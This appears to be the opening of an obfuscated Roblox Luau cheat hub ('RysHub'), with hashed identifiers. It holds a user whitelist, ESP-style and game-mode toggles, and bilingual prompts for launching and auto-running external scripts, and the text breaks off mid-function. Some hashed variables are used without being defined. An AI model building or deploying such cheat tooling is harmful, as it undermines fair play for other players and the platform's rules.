local cb6f1754ed9803d9bac95d90b467f55178a3b73fcc2f9c7c8c796e4493faf58c = game:GetService("ReplicatedStorage")
local ffbdbf911c3f36c6539f9e952882985199846d2321cb118a6a9db81c29900aa3 = game:GetService("Lighting")

local b5d14bf4bf68f7afdd910f3a69a429796ef7e160c085e9b1e77ebf4cafc3ee6a = ca4c6ce1d521b4589e17beafda3cbed6cb69402c1dcfe37952ecfa615bc538f0.LocalPlayer

local function ef4584c8f5759c61540c29ce7db4f8c1d6b706bb6271f32e54d737b917d61a1d()
	local a62d24489319795acf636e37b3bb42a939e368d0f24fdd29cfc962926c231eea, a8c3d51b1fffffd679791d1162d8e03cf80274497b50c3c622f39e390237d717 = pcall(function()
		return bcee9878e6f0472c671550126fb094f4aa84c6e053db270f2751b54781a57eab:GetPlatform()
	end)
	if a62d24489319795acf636e37b3bb42a939e368d0f24fdd29cfc962926c231eea and (a8c3d51b1fffffd679791d1162d8e03cf80274497b50c3c622f39e390237d717 == Enum.Platform.Android or a8c3d51b1fffffd679791d1162d8e03cf80274497b50c3c622f39e390237d717 == Enum.Platform.IOS) then
		return true
	end
	return bcee9878e6f0472c671550126fb094f4aa84c6e053db270f2751b54781a57eab.TouchEnabled and not bcee9878e6f0472c671550126fb094f4aa84c6e053db270f2751b54781a57eab.KeyboardEnabled
end

local fc1b0822aec4f58153efeadd99b53d3b6c47001de2c91ca6c8a3a7bf107fcc96 = ef4584c8f5759c61540c29ce7db4f8c1d6b706bb6271f32e54d737b917d61a1d()

function e5a58b44f8b449282477d3af0ee68826abb1793bf751d558302f97e36cbd1766()
	if fc1b0822aec4f58153efeadd99b53d3b6c47001de2c91ca6c8a3a7bf107fcc96 then
		local e2f931e42069755a58c603b96406c0de9b0427ace76041460384c1e876cc06f5 = workspace.CurrentCamera
		return e2f931e42069755a58c603b96406c0de9b0427ace76041460384c1e876cc06f5 and (e2f931e42069755a58c603b96406c0de9b0427ace76041460384c1e876cc06f5.ViewportSize / 2) or Vector2.zero
	end

	return bcee9878e6f0472c671550126fb094f4aa84c6e053db270f2751b54781a57eab:GetMouseLocation()
end

local e2df789cd487787b84d60559c1f9013537d6e48fc9cacd1a840b5ed48d92faf2 = {
	dda7e057cb736fcfa54d585b82c04aad18ddfc10e29442ac70ddd792cf61208c = {},
	d5b9475cdaa174930bdfaccb87a8b4d109d238451d3dc7c233d08a64428c83ba = {},
	cbde8049f3fdf4ae8741dabb098aa8e2a360cd68460fcb58ba7ebb3d735cb5cf = {},
	b84c22a5fe7aa424f3878dbc5c3f05c97bdb7653ac75487a0a8164fe782eab01 = false,
}

local c131c10db1831c669e7b65a6be7383865b5f6723f8d45a05b30c1360dbbdcb42 = {
	8343463328,
}

local eb89fbcd85b1a5e6dbb4b671cd856000adab53fef54ae137962cf615d0192cc9 = {
	[8343463328] = true,
}

for _, bc48ac79a4ce284dec99a3f095904e8947d8e5401dc9c4fc38236cf7bc2b225b in ipairs(c131c10db1831c669e7b65a6be7383865b5f6723f8d45a05b30c1360dbbdcb42) do
	eb89fbcd85b1a5e6dbb4b671cd856000adab53fef54ae137962cf615d0192cc9[bc48ac79a4ce284dec99a3f095904e8947d8e5401dc9c4fc38236cf7bc2b225b] = true
end

local fae1eb30be006c8e44de6aba901a7ef688279c90f450fcb51858610c69fe73d3 = false

local c64229c22680a642d37a658596dab8defef5f2b8c439677f0ef2da6a7486147d = {}
function c64229c22680a642d37a658596dab8defef5f2b8c439677f0ef2da6a7486147d:d3b872ed2ead33956cb0f67a1e06d79ebfaeef0f62b4a99147c4331a25234124(ba3c4b934bea70de5a8d1b7f2b9d2916292945e7c5844acabd0e3af77f75dc59)
	if fae1eb30be006c8e44de6aba901a7ef688279c90f450fcb51858610c69fe73d3 then
		return false
	end

	if not ba3c4b934bea70de5a8d1b7f2b9d2916292945e7c5844acabd0e3af77f75dc59 then
		return false
	end

	local dc016a79638a5fc1ebbf835bb2cb2fb6bb7efc0b28f6cda777a34e08f00bce89 = ba3c4b934bea70de5a8d1b7f2b9d2916292945e7c5844acabd0e3af77f75dc59.UserId
	return eb89fbcd85b1a5e6dbb4b671cd856000adab53fef54ae137962cf615d0192cc9[dc016a79638a5fc1ebbf835bb2cb2fb6bb7efc0b28f6cda777a34e08f00bce89] == true
end

local b52d828101191b6939dd78b74c4dce4a113d4f9846cd8ca1fd1f72653c0b32c4 = {}
b52d828101191b6939dd78b74c4dce4a113d4f9846cd8ca1fd1f72653c0b32c4.__index = b52d828101191b6939dd78b74c4dce4a113d4f9846cd8ca1fd1f72653c0b32c4

function b52d828101191b6939dd78b74c4dce4a113d4f9846cd8ca1fd1f72653c0b32c4.new()
	return setmetatable({ ed814f144cded4d3fa05dc40d67c826a5aa0ae9cf6f182b76b069f7648627df4 = {} }, b52d828101191b6939dd78b74c4dce4a113d4f9846cd8ca1fd1f72653c0b32c4)
end

function b52d828101191b6939dd78b74c4dce4a113d4f9846cd8ca1fd1f72653c0b32c4:d91afa2168acef65eb609290c020f2775136ad8858c49cceb9c1dfd521df5407(task)
	self.ed814f144cded4d3fa05dc40d67c826a5aa0ae9cf6f182b76b069f7648627df4[#self.ed814f144cded4d3fa05dc40d67c826a5aa0ae9cf6f182b76b069f7648627df4 + 1] = task
	return task
end

function b52d828101191b6939dd78b74c4dce4a113d4f9846cd8ca1fd1f72653c0b32c4:e2a4c47d3e0a50abcf1fa8749719510e9b3e4def86abe1b13411b90b5af22520()
	for feae7ef56bb628df32689d1f392505851ef4a490248e7bef8cb20dbc81372945 = #self.ed814f144cded4d3fa05dc40d67c826a5aa0ae9cf6f182b76b069f7648627df4, 1, -1 do
		local cb37c33053dccdbafe9ed18ecefa3485e90d04c9eaa18f451a80a51c646fc12e = self.ed814f144cded4d3fa05dc40d67c826a5aa0ae9cf6f182b76b069f7648627df4[feae7ef56bb628df32689d1f392505851ef4a490248e7bef8cb20dbc81372945]
		self.ed814f144cded4d3fa05dc40d67c826a5aa0ae9cf6f182b76b069f7648627df4[feae7ef56bb628df32689d1f392505851ef4a490248e7bef8cb20dbc81372945] = nil

		local ee1623640209eca6ab5c1117e455d06f7db3e1415950a2613eb04413d594fb86 = typeof(cb37c33053dccdbafe9ed18ecefa3485e90d04c9eaa18f451a80a51c646fc12e)
		if ee1623640209eca6ab5c1117e455d06f7db3e1415950a2613eb04413d594fb86 == "RBXScriptConnection" then
			pcall(function()
				cb37c33053dccdbafe9ed18ecefa3485e90d04c9eaa18f451a80a51c646fc12e:Disconnect()
			end)
		elseif ee1623640209eca6ab5c1117e455d06f7db3e1415950a2613eb04413d594fb86 == "Instance" then
			pcall(function()
				cb37c33053dccdbafe9ed18ecefa3485e90d04c9eaa18f451a80a51c646fc12e:Destroy()
			end)
		elseif ee1623640209eca6ab5c1117e455d06f7db3e1415950a2613eb04413d594fb86 == "function" then
			pcall(cb37c33053dccdbafe9ed18ecefa3485e90d04c9eaa18f451a80a51c646fc12e)
		end
	end
end

local cd708c990ed5a8bede0abddb79834296b39722b4b1f212d290e9259b3e986d21 = {
	db8efeb63dacbd3847f8aa854cbd00df185e557bf5812c53515f01c7ca809dbf = {
		a04ad435f54802c00122a9b6791e0bd433839f5a8d8c0972298bb9b10b5ccf85 = false,
		Language = "English",
	},
	b2d046dc7e3d7b3e6135bdd3fb6fa2ff73a1002a0e531f7e3643fa8fbf0c4902 = {
		Enabled = false,
		a9e7ee6b83496884ca2ee339f196be7908e0fe3abce4adae98c416cb7a1915fb = false,
		de5c26939d7998e8c4706abea025783e9280086fadcb257721059503af535870 = false,
		Color = Color3.fromRGB(0, 255, 0),
		d6b5abe8062c44634b75cb0f308f77fd959b60b9bff3849884d439fbd38078aa = Color3.fromRGB(0, 255, 0),
	},
	e1110a5a32828a756b5001e856959837a08cc21030047a92769f4d929e089ebc = {
		Enabled = false,
		Size = 4,
		Show = true,
		aab82c73c1c06f14b8c0037e09ae3d4f26d2aec384b4cfb45b78cbaea777b93f = 5.5,
		Color = Color3.fromRGB(255, 0, 0),
	},
	a627a22ef805300d856fbf921b5dcd87191b6a8c2898b425342d9473e4507436 = {
		b8cf17a99d673fb55e76aa32097efc4dc2464ad7031ecd534f88677948b1fae7 = false,
		b739bdadac49523048b32d916a7a24d25e15bc0b67c27a676c0f4ac85dd158c7 = false,
		cc0919b87c52bd2695e7e76bf7172c1a03fa2741e51d3799a70c9ebf6bfa9002 = false,
		e326585479382d743034efabbf69d5a08e87ff3ed56c9cc97e069181ff2ed3fa = false,
		b2f78b2a9a09fc8ea98a8d76750489afecee77e95c761828d66c97f5e6127483 = false,
	},
	c2960b7a76be9b3305b184e64c65a1daa6f203cb1b757c614b523c641cd54342 = {
		fa7ccfc3325aa833499e0c29f51174de9bf52f4b548da6f5b4f94305c5afc1a2 = false,
		f4716b979b53b0ec52a6415d7adb7a58e5eee9d32fc77df679c0676bb425adf9 = 25,
		d216889bdf19f808308ff030563c2692faed79f263e6698bc8253dd57e4d1398 = false,
		d05c51f0d0428a0b2f942e1cd0d1f6c8fd27edb8621fb35a5c5ec8b49ceab9b2 = false,
		ba7ec6dc8a502b03e95ac631d4d78ff572cd4ed17e91c012ccd40e093f4632ef = 24,
	},
	db7d1a81c5027fb2315ab6e3cb35edb668583cf2c939232da7d8d874f7e2c3b4 = {
		eac970638f9bbb12867b54ee0dbf0be970d54eadb2c8473acb1bfe6c1041ad91 = false,
		a0792bced388b7921e5d08bf01e897b3be3359ddf68d617a6143248e5fca5ae1 = false,
		a829376ef909f0bd213f4c3e0cfc862bf62633cbd37fdbf1e76012497f95bcc8 = "1v1",
		a5d67bff134a7a5d010bbf71e7a265a90f86ce57a1a57cbf72a43e9452c4829a = "Right Platforms",
		f5ec1a4b752e25152317c9e404414639bb19696c2c3f11bd2f0dca66ba972233 = false,
		fa0986f275c3464090eb38a5fa4a7b452a978843957b55b0142658071944066c = 1,
		aaf3723fa437cebd16512eaec54b63156558bb4787ce31f12ef6a12d071e5460 = false,
		f39539f216720e093ebada76240f44182f890528bffb16ba43e84a7cd000f6b5 = 4,
		c40070bcd5db956b689fbef8ba535947aadb8f7e89905d03b1e794479f8cff5a = false,
	},
	c1632afbfa6278fcd4a148700628117587cf8333fb8df0870c551fe0bf4fcc28 = {
		e1993c6dd778a98ab67e05f23817a27018add543161bac47457d238190a8cece = false,
		c41ca6d7da4714b3bd5d96100e6129d07cb4a47bb87fa8b9b49950a22f89430f = false,
		f25bb18ce7e908a029dea3750305e1095c75753c5ef4a1ab617993104b00309c = false,
		b385e10e4e8371c1c2166b1982005568f013a51bfe01793c0b1209ce539129c0 = false,
		a00ab8dbcd864baa64090b77a0141a362ff587352b8ed08ed3c648e6360a09e5 = true,
		f7ca6b5042970fe533d299b60061c621e1d2cfdbd312f7f52a53067fb82eccce = false,
		b6ad509b634d8fc0dc3b3698c7afbbb1f92ac0df2a1c7fb2272ebd8de1e5137b = true,
		f0abefb6c8a283fe8dc29df48a558ac923097b0b4dc7386dbf3f8bff53f76128 = true,
		f507e28c4b4281e3a890ac2496ed1e78245598d0b2aa1f7b0a7367db751678ad = {},
		fda17e3dbaed91bc9a9fc5fceb1da77516509590a7b5889de9e197d4340a5d60 = false,
		b0732d1eb07accc531c69bfa5573113c9a60d46e37a3c9c9dda6030e852c6afd = false,
		df8e4982070b123c8d790f95ce32918ae56d0f914a532b7e2097acee179f72a4 = false,
		d741b84e373d987f5faeb14feaf5d7c171cd68fb1836728254289bb24b40e1a5 = false,
		b7ba436e306fa05fc02bb9f6704723ce0b49371c6b492d90521402b62d06cee3 = false,
		e82f731ef9ed150f0f1fe7dbb634d5c6a2285d60f0a8d613497c7682ab6ac1f7 = true,
		f2d9c0c5a5c7e1a4325c7efcb2e04af45cefb6092b02ed4992285317aebf3b93 = 200,
		f28945dea657ee4a834155f2862ece5d73476423c582aab2a678f31cf01f74bd = 100,
	},
	eb081e36075b9b3f2e35b09c3d6e573761a3398d8628b33ef7b0af13fa743578 = {
		Selected = "Knife Box #1",
		aad55a9aa81195ca472c08b9468f72e18d322e65c0cb24bc22be17de591f3acf = 500,
		aaf0264c8754ab6f2938698ead86067f2a7046b76e80297078da33864b6ddeec = false,
	},
	d20c9adb5047758aef6cbceff9cb4c14a93eda9a826b43a83933a570f293aa0a = {
		Enabled = false,
		bac88e50d882582808f2709116ceb3014ef14c95ec050bc68846744e6c400214 = false,
		fb990f124eee7bfc7547ab655a31b0abe3eee90ce6d2dc38ab41ce22050ea99b = 0,
	},
	e4985ced963b0bd9fe119d065de125b19fc622cdf7e63968361394bb19860cda = {
		bbbf325af80949abc9298786e2917a71993cfe240200c7019ef19d58e6354704 = false,
	},
	f749bd7dbe75599e79fc1fea27c31d0b0cd7e37832e80419d6f019457d8f3e51 = {
		b965cd5e9f6f681c2ccf519b6ec0bbed54e0a07d85f8dc95366dbe5a447d1202 = "RightControl",
		b2d046dc7e3d7b3e6135bdd3fb6fa2ff73a1002a0e531f7e3643fa8fbf0c4902 = "",
		e1110a5a32828a756b5001e856959837a08cc21030047a92769f4d929e089ebc = "",
		b385e10e4e8371c1c2166b1982005568f013a51bfe01793c0b1209ce539129c0 = "",
		fda17e3dbaed91bc9a9fc5fceb1da77516509590a7b5889de9e197d4340a5d60 = "",
		b0732d1eb07accc531c69bfa5573113c9a60d46e37a3c9c9dda6030e852c6afd = "",
		df8e4982070b123c8d790f95ce32918ae56d0f914a532b7e2097acee179f72a4 = "",
		d741b84e373d987f5faeb14feaf5d7c171cd68fb1836728254289bb24b40e1a5 = "",
	},
}

local dd66726dd9995fffcf0fc0647978ebe48fdf59dfc57a7c23578107f4d94187f0 = {
	en = {
		cd7fc633be05ceb48c0a4314a22dd26ff92dc424545ae2fbe8863e6e140ca5fd = "Could not open the confirmation popup.",
		efdbbd51decdb15aa088251de55395f06946134ea56cdacd863769f037fb20b4 = "Cancel",
		fefe7300256263fb9bfda4d10d11921c1036fa9a2dbe5e5f0531b69b2379104b = "Continue",
		d1ef65cc1300f5e4db0827b034a063d63d2a39c2df8737a13770b0ffc4cbb623 = "Confirm Script",
		dc9a82580f340ee0841653ad4696de7e9e50cfc180db3af67e91a3928d2f6caf = "You are about to run %s.\n\nDo you want to continue?",
		e78f8016268366a1cacb4ee7a0e2e1631dc0eddfa71bd1e96e8a5a14b3ba6cf3 = "Unload RysHub",
		a5c3a6c314b418cafde708dea2cacc1e89ec9f6356ac71c139bb95342eb3343f = "Every active feature will be switched off and the UI removed.\n\nDo you want to continue?",
		a930a6cf71081413470030137f606a4abb7f2e4805307e33c7d1c79b9a1df398 = "Could not unload the script.",
		a66c278f0ae58655a1e3ea26090e441380a0525891de67a83ebf24438631e589 = "Locked by Always On",
		b7a85554878e7fd8ef7a096e690ac4cb89c5b49025c3f08fbc7508a13a064615 = "Script launched.",
		ee485643f3491194df73120facc3e6857c045d8f74d6349d56c53747e7a08a8a = "Could not run the script.",
		c2849a3c0c2ceef85db06c51bad2fd7b7350ec08e1a04c39544064509edf972e = "Language",
		fcd3a15b038d0512d5d29f7e6a629bca6f82784bba872d6eb27c8e250315d435 = "Language changed to %s.",
		c10dbcedd5855619d84aa47add992a712ed3e01d7b623cec216bcde74e7b269b = "External Scripts",
		e9c271babf349bec7e0b91cc5a3382f4859e78a2350d31600836c5ccc8590777 = "EMOTES",
		b9e052f8a527fc8fe4ff0fa3a1952da78037058a892551086a5bdbacadbad351 = "Opens the external emotes menu.",
		e7d11c329fd1569351b9346950f57c8fc7ff017e92237cc1e59ac9d32ec17ba4 = "Auto Execute Emotes",
		bb8ad7e9970ee0898a1c84720ce3b8e32b2f22ca7f11fb55e85a7c3110d1a0a5 = "Runs Emotes automatically after startup.",
		c4f2a0d87c22eed83191e2f488383e6875fcedd2bc9b34382bc849ac3981ad45 = "COPY SCRIPT",
	},
	es = {
		cd7fc633be05ceb48c0a4314a22dd26ff92dc424545ae2fbe8863e6e140ca5fd = "No se pudo abrir la confirmación.",
		efdbbd51decdb15aa088251de55395f06946134ea56cdacd863769f037fb20b4 = "Cancelar",
		fefe7300256263fb9bfda4d10d11921c1036fa9a2dbe5e5f0531b69b2379104b = "Continuar",
		d1ef65cc1300f5e4db0827b034a063d63d2a39c2df8737a13770b0ffc4cbb623 = "Confirmar script",
		dc9a82580f340ee0841653ad4696de7e9e50cfc180db3af67e91a3928d2f6caf = "Vas a ejecutar %s.\n\n¿Querés continuar?",
		e78f8016268366a1cacb4ee7a0e2e1631dc0eddfa71bd1e96e8a5a14b3ba6cf3 = "Descargar RysHub",
		a5c3a6c314b418cafde708dea2cacc1e89ec9f6356ac71c139bb95342eb3343f = "Se van a apagar todas las funciones activas y se saca la UI.\n\n¿Querés continuar?",
		a930a6cf71081413470030137f606a4abb7f2e4805307e33c7d1c79b9a1df398 = "No se pudo descargar el script.",
		a66c278f0ae58655a1e3ea26090e441380a0525891de67a83ebf24438631e589 = "Bloqueado por Siempre Activo",
		b7a85554878e7fd8ef7a096e690ac4cb89c5b49025c3f08fbc7508a13a064615 = "Script ejecutado.",
		ee485643f3491194df73120facc3e6857c045d8f74d6349d56c53747e7a08a8a = "No se pudo ejecutar el script.",
		c2849a3c0c2ceef85db06c51bad2fd7b7350ec08e1a04c39544064509edf972e = "Idioma",
		c10dbcedd5855619d84aa47add992a712ed3e01d7b623cec216bcde74e7b269b = "Scripts Externos",
		e9c271babf349bec7e0b91cc5a3382f4859e78a2350d31600836c5ccc8590777 = "EMOTES",
		b9e052f8a527fc8fe4ff0fa3a1952da78037058a892551086a5bdbacadbad351 = "Abre el menu externo de emotes.",
		e7d11c329fd1569351b9346950f57c8fc7ff017e92237cc1e59ac9d32ec17ba4 = "Auto Ejecutar Emotes",
		bb8ad7e9970ee0898a1c84720ce3b8e32b2f22ca7f11fb55e85a7c3110d1a0a5 = "Ejecuta Emotes automaticamente al iniciar.",
		c4f2a0d87c22eed83191e2f488383e6875fcedd2bc9b34382bc849ac3981ad45 = "COPIAR SCRIPT",
		fcd3a15b038d0512d5d29f7e6a629bca6f82784bba872d6eb27c8e250315d435 = "Idioma cambiado a %s.",
	},
}

local function bd5d37a7d09f106355cd76360a9dfe6c2b9984e0d1e874820ce3201901dc2910(ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f)
	local d5ebdf6fc9faed7d44f76e013db811f501ef1aed1066625f71d15b725a636997 = tostring(ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f or "")
	if d5ebdf6fc9faed7d44f76e013db811f501ef1aed1066625f71d15b725a636997 == "es" or d5ebdf6fc9faed7d44f76e013db811f501ef1aed1066625f71d15b725a636997 == "Espanol" or d5ebdf6fc9faed7d44f76e013db811f501ef1aed1066625f71d15b725a636997 == "Español" or d5ebdf6fc9faed7d44f76e013db811f501ef1aed1066625f71d15b725a636997 == "Spanish" then
		return "Espanol", "es"
	end
	return "English", "en"
end

local function b9723440239ad9c8647636c0e9348a6ebaac5a4cd38369c91265639579feb3b6()
	local a1918d6fdbaa3d92927590b76080c4cb10779b9fbc124231a3ea7d8e8df75eb5 = bd5d37a7d09f106355cd76360a9dfe6c2b9984e0d1e874820ce3201901dc2910(cd708c990ed5a8bede0abddb79834296b39722b4b1f212d290e9259b3e986d21 and cd708c990ed5a8bede0abddb79834296b39722b4b1f212d290e9259b3e986d21.db8efeb63dacbd3847f8aa854cbd00df185e557bf5812c53515f01c7ca809dbf and cd708c990ed5a8bede0abddb79834296b39722b4b1f212d290e9259b3e986d21.db8efeb63dacbd3847f8aa854cbd00df185e557bf5812c53515f01c7ca809dbf.Language)
	return a1918d6fdbaa3d92927590b76080c4cb10779b9fbc124231a3ea7d8e8df75eb5
end

local function aaf61533e53681f2e976f1a9d57e472c50f484d578309470a057395efddc91bf()
	local _, ac6865d8ae5959362516dee639970fa933b3bf2d7d88c3c466ee5dd176e06448 = bd5d37a7d09f106355cd76360a9dfe6c2b9984e0d1e874820ce3201901dc2910(cd708c990ed5a8bede0abddb79834296b39722b4b1f212d290e9259b3e986d21 and cd708c990ed5a8bede0abddb79834296b39722b4b1f212d290e9259b3e986d21.db8efeb63dacbd3847f8aa854cbd00df185e557bf5812c53515f01c7ca809dbf and cd708c990ed5a8bede0abddb79834296b39722b4b1f212d290e9259b3e986d21.db8efeb63dacbd3847f8aa854cbd00df185e557bf5812c53515f01c7ca809dbf.Language)
	return ac6865d8ae5959362516dee639970fa933b3bf2d7d88c3c466ee5dd176e06448
end

local function d519bcfcdf971a33cc28909094c8c29be2923b15e362fc081729c78eafc702b7(ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f)
	local a1918d6fdbaa3d92927590b76080c4cb10779b9fbc124231a3ea7d8e8df75eb5 = bd5d37a7d09f106355cd76360a9dfe6c2b9984e0d1e874820ce3201901dc2910(ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f)
	cd708c990ed5a8bede0abddb79834296b39722b4b1f212d290e9259b3e986d21.db8efeb63dacbd3847f8aa854cbd00df185e557bf5812c53515f01c7ca809dbf.Language = a1918d6fdbaa3d92927590b76080c4cb10779b9fbc124231a3ea7d8e8df75eb5
	return a1918d6fdbaa3d92927590b76080c4cb10779b9fbc124231a3ea7d8e8df75eb5
end

local function d8406ab9d5fa84955178539d90679827c165782e546cfebceded6f73bfa5280d(e9bd96663962b232de261bda9ceff095c7f55882c6424a0ee9432ff73908df4c, ...)
	local d01a404a2322f0c75534d22c416bdfe6a05d323238bc803ff93af078dc27ca85 = aaf61533e53681f2e976f1a9d57e472c50f484d578309470a057395efddc91bf()
	local a73bf63f3de1e8edb845eeff8b6d79fed00598a7fce18270c022250b20633463 = dd66726dd9995fffcf0fc0647978ebe48fdf59dfc57a7c23578107f4d94187f0[d01a404a2322f0c75534d22c416bdfe6a05d323238bc803ff93af078dc27ca85] and dd66726dd9995fffcf0fc0647978ebe48fdf59dfc57a7c23578107f4d94187f0[d01a404a2322f0c75534d22c416bdfe6a05d323238bc803ff93af078dc27ca85][e9bd96663962b232de261bda9ceff095c7f55882c6424a0ee9432ff73908df4c] or nil
	local e5a8f53d0573aa2316115f336f6f841f538406c3758584db30db96403b866016 = dd66726dd9995fffcf0fc0647978ebe48fdf59dfc57a7c23578107f4d94187f0.en[e9bd96663962b232de261bda9ceff095c7f55882c6424a0ee9432ff73908df4c] or e9bd96663962b232de261bda9ceff095c7f55882c6424a0ee9432ff73908df4c
	local e119cc8d10372f51e9233a93465670dec1192fb4169a1a05e18624cbadfb2b4e = a73bf63f3de1e8edb845eeff8b6d79fed00598a7fce18270c022250b20633463 or e5a8f53d0573aa2316115f336f6f841f538406c3758584db30db96403b866016
	if select("#", ...) > 0 then
		return string.format(e119cc8d10372f51e9233a93465670dec1192fb4169a1a05e18624cbadfb2b4e, ...)
	end
	return e119cc8d10372f51e9233a93465670dec1192fb4169a1a05e18624cbadfb2b4e
end

local function a4e4a128393704a2f4f31624c9f4949388a173459f41b135cf8029181d28ecef()
	local aff5a40534431cd261bd16f81d583c9cb2b59e2d154db8be9f84fc6461840c12 = b9723440239ad9c8647636c0e9348a6ebaac5a4cd38369c91265639579feb3b6()
	pcall(function()
		f199147bcb15044501a86dc4948882b58aa1fef3c290af2239ed896b7f2756b9:SetLanguage(aff5a40534431cd261bd16f81d583c9cb2b59e2d154db8be9f84fc6461840c12)
	end)
	return aff5a40534431cd261bd16f81d583c9cb2b59e2d154db8be9f84fc6461840c12
end

local function a376298c9d34b285fb00cc8c8c5f7bfdee9d4daaa41ab79961e4f0993fad2385(ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f, e5a8f53d0573aa2316115f336f6f841f538406c3758584db30db96403b866016)
	if typeof(ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f) == "Color3" then
		return ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f
	end
	if typeof(ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f) == "BrickColor" then
		return ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f.Color
	end
	if type(ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f) == "table" then
		local a9347c5d0d0da4d09b9c41ff24d5890728365d38bf04fd0bcdae30726335b72e = ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f.R or ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f.r or ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f.Red or ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f.red or ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f[1]
		local e4e4e6fea1284c62684ccb7debbc79ee3fd91ed9ca95fbb9a8e86e7945cfa762 = ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f.G or ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f.g or ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f.Green or ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f.green or ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f[2]
		local de1169dae3883699bbfcb6e70ecdf3bac7e939ba3a288d83db5f23170af4015e = ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f.B or ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f.b or ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f.Blue or ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f.blue or ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f[3]
		if type(a9347c5d0d0da4d09b9c41ff24d5890728365d38bf04fd0bcdae30726335b72e) == "number" and type(e4e4e6fea1284c62684ccb7debbc79ee3fd91ed9ca95fbb9a8e86e7945cfa762) == "number" and type(de1169dae3883699bbfcb6e70ecdf3bac7e939ba3a288d83db5f23170af4015e) == "number" then
			if a9347c5d0d0da4d09b9c41ff24d5890728365d38bf04fd0bcdae30726335b72e > 1 or e4e4e6fea1284c62684ccb7debbc79ee3fd91ed9ca95fbb9a8e86e7945cfa762 > 1 or de1169dae3883699bbfcb6e70ecdf3bac7e939ba3a288d83db5f23170af4015e > 1 then
				return Color3.fromRGB(math.clamp(a9347c5d0d0da4d09b9c41ff24d5890728365d38bf04fd0bcdae30726335b72e, 0, 255), math.clamp(e4e4e6fea1284c62684ccb7debbc79ee3fd91ed9ca95fbb9a8e86e7945cfa762, 0, 255), math.clamp(de1169dae3883699bbfcb6e70ecdf3bac7e939ba3a288d83db5f23170af4015e, 0, 255))
			end
			return Color3.new(math.clamp(a9347c5d0d0da4d09b9c41ff24d5890728365d38bf04fd0bcdae30726335b72e, 0, 1), math.clamp(e4e4e6fea1284c62684ccb7debbc79ee3fd91ed9ca95fbb9a8e86e7945cfa762, 0, 1), math.clamp(de1169dae3883699bbfcb6e70ecdf3bac7e939ba3a288d83db5f23170af4015e, 0, 1))
		end
	end
	return e5a8f53d0573aa2316115f336f6f841f538406c3758584db30db96403b866016
end

local a2b89a0b2cb9a4c6d2f7331775132c4de3ef6340586a0602bc2b87762ab99117

local fa85acb162bef04481b89aab3fff3dc7896e75ec7d59789c9559dee19e1a4b09 = {
	a79299c39aade2d27ee4c560757aa682e72afcd1142e676510c7e1b1d320e8ab = false,
}

local function dc4a3ace0272951f336798884dae71df2bb92b6bd6857f0fa746452d5d7ce54a(f06954555d210d2f4d60d3cce2b192c9ce72651108f13db8fe43fca84ec0c75c, ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f)
	if ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f == nil then
		return
	end

	fa85acb162bef04481b89aab3fff3dc7896e75ec7d59789c9559dee19e1a4b09.a79299c39aade2d27ee4c560757aa682e72afcd1142e676510c7e1b1d320e8ab = true
	pcall(function()
		f06954555d210d2f4d60d3cce2b192c9ce72651108f13db8fe43fca84ec0c75c:Set(ed3c504003fa3e9ba3b67dd1461f77b1fe4daefa6d7f543b54b50769107d593f)
	end)
	fa85acb162bef04481b89aab3fff3dc7896e75ec7d59789c9559dee19e1a4b09.a79299c39aade2d27ee4c560757aa682e72afcd1142e676510c7e1b1d320e8ab = false
end

function e2df789cd487787b84d60559c1f9013537d6e48fc9cacd1a840b5ed48d92faf2.d42c4379ec633ab978ca01fe14b977bf37409b81b7b8b5baea1a364ec6eb7a2a(de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40)
	if not de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40 or not de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40.Parent then
		return
	end
	local d061a31a3c2f278d1f1ae21305ff0f3834771368bfb9a2d1f5951a7377b9f43a = de0fee2b4aab679c2e57522ef178c064904688ee9891d778158e19b3d2e67a40:FindFirstChildOfClass("UIStroke")
	if not d061a31a3c2f278d1f1ae21305ff0f3834771368bfb9a2d1f5951a7377b9f43a then
		return
	end
	if e2df789cd487787b84d60559c1f9013537d6e48fc9cacd1a840b5ed48d92faf2.b84c22a5fe7aa424f3878dbc5c3f05c97bdb7653ac75487a0a8164fe782eab01 then
		d061a31a3c2f278d1f1ae21305ff0f3834771368bfb9a2d1f5951a7377b9f43a.Color = Color3.fromRGB(79, 195, 247)
